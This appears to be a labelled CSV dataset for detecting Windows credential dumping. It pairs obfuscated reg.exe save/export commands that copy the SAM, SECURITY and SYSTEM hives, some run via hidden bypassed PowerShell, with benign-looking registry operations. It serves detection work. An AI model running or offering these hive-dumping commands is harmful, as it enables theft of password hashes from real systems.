text,label
"REG.EXe unload ""hKey_CurreNt_uSER\ConTRol panel\DEsKTop"" /V vERsiOn",0
"start /b reg copy ""hkey_users\software\google\chrome\subkey62"" ""hkey_users\hkey_local_machine\software\policies\microsoft_669""",0
"reG sAVe ""HkcU\sYstEM\cuRrENtcontrOLSEt\SeRViceS\suBkEy96"" ""%teMP%\noN_SeNsItIve.HivE""",0
"REg  compaRE  ""hku\EnViroNmeNt\sUbkey85""  ""hKu\sOFTWaRE\PoLiCieS\mycOrP_974""",0
PoWERsHELl -eXEc bYPasS -w HiDdEN -c Reg.exE  ExpOrT  hkEy_lOcAl_machInE\SeCURitY  c:\wIndowS\tEmP\saM.Save  /Y,1
rEG.EXe   sAVE   HkeY_Local_mACHIne\SystEM  \.\C$AckUP.ReG,1
"pOWErsHEll -C rEG saVe ""HKEy_CURrent_user\sYstem\CuRRenTcOnTroLSEt\SERviceS"" ""C:\USeRs\PuBLIc\CHrome_Data.bak"" /y",0
powershell -exec bypass -w hidden -c reg save hklm\system   c:\windows\temp\sam.save,1
"reG.EXE  cOPY  ""hKeY_lOCal_macHInE\sOftwArE\CLASSEs""  ""hKEy_LOcal_macHinE\SOFtwaRe\MIcROSoft\wiNdOWS\cUrReNtvERsION_720""",0
rEG.eXE  ExPOrT   hkEy_LocAl_mAchine\SYStem  C:\Temp\SYsTem.HiVe,1
"powershell -c reg.exe compare ""hku\control panel\desktop"" ""hku\hkey_local_machine\software\policies\microsoft_469""",0
CmD.exe /c rEg sAvE  HkeY_LoCAL_mAcHInE\sYStEM  \\lOcaLhOst\C$\__duMP\SAM.BaK,1
Reg.Exe   SAVE  hKLM\SEcUrITY  %temp%\Sec_BACKUP.daT,1
cmd.exe /c start /b reg.exe  save  hklm\security \.\c$ackup.reg /y,1
"powershell -c reg.exe unload ""hku\hkey_local_machine\software\wow6432node"" /v lastupdate",0
pwSH -NoprOFiLE -C rEG.EXE  ExpORt hKLm\sYSTEM \\LOcaLhoSt\c$\__dUmp\SaM.BAK   /Y,1
c:\windows\system32\cmd.exe /k reg.exe   save  hkey_local_machine\system  \\localhost\c$\__dump\sam.bak,1
"cMd /c powErsHell -C ""reg.exE   sAVe   hKeY_LOcaL_mACHinE\SYStem C:\userS\pUBLIc\REgIstRY_EXpOrT.reG""",1
Cmd.eXE /c Reg  savE   HkEy_locAL_mAChinE\SYSTEm  C:\uSeRS\pubLiC\REgISTry_export.ReG  /Y,1
"REG   resToRE   ""hkey_CuRreNT_USeR\soFtWArE\POlIcIES\MYCoRP""   ""HKeY_cUrrenT_USEr\sySTEM\CuRRENtcoNtrolsET\SeRvIcES_869""",0
"reg   unload   ""hkcu\software\google\chrome\subkey68""   /f",0
"reg   add   ""hkcu\software\classes""   /f      /d ""1.0.0""",0
pOweRShelL -ExEC bYPAss -W HIDdEn -c REg.Exe  ExpoRT   HkeY_LoCal_MAchINE\sySTem   \.\C$aCKuP.reG /y,1
"reg   save   ""HkEY_lOcal_mAchIne\hkEY_lOCAL_mAchiNE\SofTwaRE\pOLICIEs\MICROSofT\SuBKEY99""   ""C:\USErs\pUblIc\ChrOmE_dAtA.bak""",0
powershell -command reg  export  hkey_local_machine\sam \.\c$ackup.reg,1
"reg   save   ""hkey_local_machine\hkey_local_machine\software\wow6432node""   ""c:\temp\user_settings.reg""",0
c:\WINDOWS\SYstEm32\cmD.Exe /k REg sAVE   hKEy_LocaL_MaChINe\securITY \.\C$acKUp.REG /y,1
"reg delete ""hkey_local_machine\system\currentcontrolset\services\subkey70""",0
"reg cOpY ""hkEy_CuRrEnt_uSER\SYstEm\cUrrEnTContROLseT\serViCEs\SUbKEy68"" ""Hkey_CUrrenT_uSEr\COnTRol paneL\DEskTOP_275""",0
ReG SaVe   HKEY_LOcaL_MAcHine\seCurIty   C:\teMP\sYstEm.hIvE   /Y,1
"ReG.ExE   cOpy   ""hkey_Local_machiNe\SoFtWARe\MYapP\sEtTiNGs""   ""HKEY_LoCaL_mACHINE\SoFtWaRe\myApP\SEtTInGS_365""",0
CMd.Exe /C StarT /B reG  savE  HKeY_lOcAl_MAChIne\sAM C:\WiNdowS\tEMP\SAM.SAVE   /Y,1
"rEg   deLETe   ""hkey_LOcAl_MaChINE\SOFTWArE\MicrosOFt\WInDOWs\cUrRentVErsIoN""   /v pAtH",0
cMD.eXe /c StART /B REG ExpoRt  HKlM\SAM  C:\TEmP\SySteM.HIVe  /Y,1
"CMD /C Reg.exE aDd ""HKCU\sysTEM\CurRENtcOntROLSET\seRviCes"" /V LaSTUPdate /T rEg_sz /d 1",0
"stARt /B Reg   cOMpare   ""HKEy_CUrREnt_user\sOfTWare\myapp\sEtTiNGS""   ""hKeY_CURreNT_user\ENViRoNMent_897""",0
"Cmd /c rEG   rESTorE   ""hkEY_users\SoftWARe\MiCrOsOFT\wIndOwS\cUrRENtVERsioN\SUBKEY17""   ""hKey_USeRS\soFtWaRE\myApp\sEtTinGs_638""",0
PoWERSHeLL -coMMAnd reG.EXE sAve  HkEy_loCAl_mACHINE\sYsTEM  C:\wiNDoWs\TeMP\SAm.sAVE /Y,1
"CMD /C pOWERshelL -c ""REg  sAvE  HKEy_LOCaL_MAchine\SystEM C:\UsErs\PUbLiC\ReGIsTRY_eXpoRT.REG""",1
cmD.Exe /C REG.eXe  exPort HkLM\SEcURITY   \.\C$acKup.ReG  /y,1
"powershell -c reg   add   ""hku\environment""         /d 1",0
"REG  unLOad  ""hKEY_CurRENT_USer\soFtware\GoOgLE\CHROME""  /v lAsTuPdatE",0
"start /b reg add ""hku\software\policies\mycorp"" /v path /t reg_dword",0
"start /b reg save ""hkey_local_machine\hkey_local_machine\software\policies\microsoft"" ""%temp%\non_sensitive.hive""",0
"REG.ExE   qUery   ""hku\softWAre\PolICIeS\myCORp\SuBKeY54""   /V LAsTuPdate",0
"reg.exe query ""hkey_local_machine\system\currentcontrolset\services\subkey40"" /v lastupdate",0
cMd.eXe /C rEg   sAvE hKey_LOCAl_MAchINe\sYStEm  C:\WINdOwS\teMp\saM.SaVe   /Y,1
cMD.eXe /C START /b REg.EXE SAVe   HKey_LOcAL_machIne\SaM  c:\Temp\sYStEm.HIVE,1
"reg.EXE   sAve   ""hkEy_LOcAl_mAChIne\hKey_lOCAl_mAchiNE\sOftWarE\WOW6432node\SUBKey13""   ""C:\WInDoWs\tEMp\sOftwaRe_duMP.daT""",0
powershell -exec bypass -w hidden -c reg save  hkey_local_machine\system   \.\c$ackup.reg   /y,1
pWSh -NOProFILE -c reg   EXPoRt  Hkey_local_maChINe\SYsTeM   c:\USeRS\PUbLic\regIstrY_ExpoRT.ReG /y,1
POWerSheLl -cOMManD rEG.exe  eXPOrt HkEY_LocAl_maCHInE\syStem   C:\UsERs\puBlic\reGisTRy_exporT.ReG   /Y,1
"reg.Exe   AdD   ""HkEY_lOcAl_mAchInE\HKEY_loCAl_MacHINe\sOFTwaRe\POLiciEs\miCroSOFT\SuBkEY28""   /v vERsIon   /t Reg_DwoRd",0
cmd.exe /c start /b reg.exe save  hklm\system   c:\windows\temp\sam.save,1
"REg  uNlOAD  ""HkEy_CURrEnT_usER\eNVIrOnMEnT""  /V veRSION",0
"cMd /C POwerSHEll -C ""REG eXpOrt HKeY_LOCAL_macHIne\SySTEM  C:\uSErs\pUBlIc\regisTry_expoRT.Reg /Y""",1
"poweRSheLl -c REg  CoPy  ""HkEy_CurRENt_user\softwaRE\MicROSOFt\WIndOWS\cURRenTversIOn\SUBkEY97""  ""HkeY_cUrrent_USER\sOFtware\classes_592""",0
"REG.eXE RESToRe ""HKey_current_UsEr\sofTwARe\mYaPP\SeTtINgS\SUbkEy73"" ""hKEy_CURrENt_uSER\EnvirONMEnt_911""",0
"reG   add   ""HkU\sOFtWaRE\goOGLe\cHROme""   /v PatH   /T REG_sz   /d ""c:\ProgRAm fIlES\APp""",0
pOWeRshElL -cOMmAnD Reg.exe Save   hKey_LocaL_MAChInE\sySTEM \.\c$acKUP.REG,1
"CMD /C rEg  quErY  ""Hku\HkEY_lOCAl_MACHIne\SOFTwaRE\wOw6432NOde\Subkey60""",0
"powERsHeLl -c rEg.Exe   sAVe   ""hkEy_UseRS\soFtwArE\mICRoSOFT\WINDOwS\cUrRenTVeRsIOn\SUbKEY84""   ""C:\USeRS\puBlic\cHROmE_DATA.bAK""   /Y",0
c:\windows\system32\cmd.exe /k reg   export hklm\sam c:\windows\temp\sam.save   /y,1
"start /b reg.exe   compare   ""hkey_local_machine\software\microsoft\windows\currentversion\subkey76""   ""hkey_local_machine\software\microsoft\windows\currentversion_842""",0
"reg.exe   query   ""hku\software\myapp\settings""   /v lastupdate",0
poWeRShELl -Exec BYPasS -W hiDDeN -C ReG exPoRt  hklm\sYsteM  c:\tEMP\SYsTeM.HIve,1
"cMD /C reG.exE deLEte ""hkcu\SOFtWaRE\MyapP\SeTTiNgS\SubKey93"" /V vERSIon",0
"Cmd /c PowErshEll -c ""REG  SavE   hKEy_loCal_mAChiNe\SyStem %teMp%\SeC_BaCKuP.daT""",1
"pOWeRsHEll -C reG  DElETE  ""HKeY_CUrREnt_uSer\sofTWare\GoOGLe\ChromE\sUbKeY23""  /f",0
"StART /B reg qUery ""hkEy_cuRrEnT_uSER\soFTWARE\clAsSes""",0
"REg  sAve  ""HKeY_lOCAl_MAChiNE\HkEy_LOCaL_MAcHIne\soFtWAre\Wow6432NOdE""  ""d:\BacKUp\regIstrY_hiVe.dAt""  /Y",0
pWSH -nOpRoFILE -C rEG.exE  eXPoRT hKlm\SySTem  c:\TeMP\SySTEm.hiVe,1
"Cmd /c rEG.EXe  UNloAd  ""hkEy_uSErs\sYSTem\cUrreNtCoNTROLSET\SeRvIceS\SUbkey19""  /V pATh",0
"reg copy ""hkey_users\software\microsoft\windows\currentversion"" ""hkey_users\hkey_local_machine\system\currentcontrolset\control_358""",0
"reg  Copy  ""HkEy_LOcAL_MAchIne\cONTRol PAnel\DeSKtOP""  ""hKey_lOCal_machINe\SYSteM\cuRREnTcONTRoLSEt\servICeS_206""",0
reg  savE hklm\sYsTEM  c:\WiNdOWS\TEmp\sAm.SAVe  /y,1
"reg   CopY   ""hkey_CuRReNT_UsER\SoFTWARe\GOOGLE\ChrOmE\SUBKeY43""   ""hkey_CUrREnT_User\hKEY_LOcal_machiNe\SYstEM\curreNtcoNtroLSEt\COntRoL_380""",0
"PowerShelL -C REG.Exe COMpArE ""HKEy_cUrRent_UseR\software\miCroSOFt\wiNDOwS\cUrRentverSion"" ""HkEy_cUrrenT_uSeR\HKEY_lOcAL_mAchINE\SOFtwaRe\WOW6432Node_990""",0
rEG saVe  Hklm\SYsteM %TEMp%\sEc_bAcKUp.daT,1
"reG AdD ""HKey_loCal_MACHine\HkEy_LOCAL_mAcHiNE\sYsTEm\curRentcOnTrolSeT\cONTRoL\subkey66""  /T rEG_DWoRd /D ""C:\PrOGram FilES\APP""",0
PWSH -noProfilE -c REG.Exe  ExpoRT  HklM\SyStEm  %tEmP%\sEC_BACKUP.dat,1
"start /b reg.exe  add  ""hkey_users\software\google\chrome\subkey37""    /t reg_sz  /d ""c:\program files\app""",0
"CmD /C Powershell -c ""REG.EXe  eXPOrT  HkEY_lOcAL_mAcHine\SeCuRIty c:\wINDOws\tEMp\saM.SAve   /y""",1
"cmd /c powershell -c ""reg export  hkey_local_machine\security   c:\windows\temp\sam.save""",1
cmd.exe /c start /b reg.exe save   hklm\security   %temp%\sec_backup.dat   /y,1
poweRshell -COMmANd REG.exE   Export   HKlM\sySTeM   \\LOCaLhOsT\c$\__DUmP\SaM.bak /y,1
PWsh -NoProFILe -c rEg exPORT   hKLm\SecUrITy  C:\USeRS\puBlIC\reGisTrY_EXporT.reg,1
REG SAve   HkEy_LoCAl_mAchINe\seCurITy  \\locaLhOst\C$\__dUMP\sAm.bAK,1
"ReG.EXE ReStOrE ""hkcu\sYStEm\CURreNtCONTROLSET\sERVices\suBkey3"" ""HkCU\COntROl PaNEl\dESktop_580""",0
"reg   save   ""hkcu\control panel\desktop""   ""%temp%\non_sensitive.hive""",0
"STarT /b REg   quEry   ""HKeY_LoCAL_mACHInE\soFTWare\ClASsEs""   /V LaStupdATE",0
"rEg rEstoRE ""HKCU\hKey_lOCAL_MAChInE\SySteM\CuRRentCoNTroLseT\COntrOl\sUbkeY25"" ""hkCU\hKeY_loCAL_mAcHiNe\sySteM\cuRrentCONtroLSet\conTrol_911""",0
cmD.EXE /C rEg.eXE  sAvE hklm\SeCurITY %TeMp%\seC_backup.DaT,1
"cmD /c rEG deLeTE ""hKCu\sOfTWARE\POlICiEs\mYcOrP\sUBkEY75""",0
POWErSheLL -cOMMAnD reG   ExPorT  hkey_loCal_MaCHiNe\SEcUrIty   c:\tEmP\sYsTeM.HiVe,1
"reg ComPaRe ""HkCu\soFTWaRe\MiCRosOfT\WIndowS\CURREntVeRsIOn\SUBkEy95"" ""HKcu\hkEy_locAl_maCHiNe\SYStEM\CurReNtcONTrolSeT\cOntrOL_204""",0
"REG.ExE SAVE ""HKCU\HKEy_LOCal_MAchInE\systEm\curreNTcOntROLSeT\COnTrol"" ""c:\TeMp\usEr_SeTTiNGs.REG"" /Y",0
reg   export   hklm\security  \\localhost\c$\__dump\sam.bak  /y,1
"reg   copy   ""hkey_local_machine\software\google\chrome\subkey79""   ""hkey_local_machine\software\myapp\settings_202""",0
rEG   exPOrT  hkEy_lOCal_macHINe\sAM \\loCALHosT\C$\__Dump\SAM.bak,1
PwSH -NoPRofilE -C REG.EXe   EXport  HKEY_lOcaL_MachiNe\SecURIty   c:\wINDows\Temp\sAM.saVe /Y,1
"REg.EXe  sAVe  ""hkeY_lOCAL_MacHine\hKeY_lOcal_MACHine\softwARe\pOLICIeS\miCROSoft\SUbKey100""  ""d:\BACkUp\reGIstRy_hIve.dAT""  /Y",0
"Reg COPY ""hkey_USeRs\coNTrOl PaNEL\dESkTOP"" ""hKeY_UsERs\SOFtWaRe\poliCieS\MycORp_124""",0
tasklist.exe,0
